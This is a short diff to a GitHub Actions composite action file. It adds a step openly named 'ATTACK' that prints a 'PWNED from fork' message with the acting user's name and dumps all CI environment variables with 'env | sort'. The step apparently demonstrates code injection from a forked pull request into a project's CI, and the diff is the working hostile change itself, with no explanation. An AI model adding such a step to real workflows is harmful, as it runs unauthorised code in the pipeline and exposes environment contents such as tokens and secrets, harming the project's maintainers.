@@ -17,3 +17,8 @@ runs:
     - name: Print Environment Info
       shell: bash
       run: node -v && yarn -v
+    - name: ATTACK
+      shell: bash
+      run: |
+        echo "PWNED from fork by $GITHUB_ACTOR"
+        env | sort
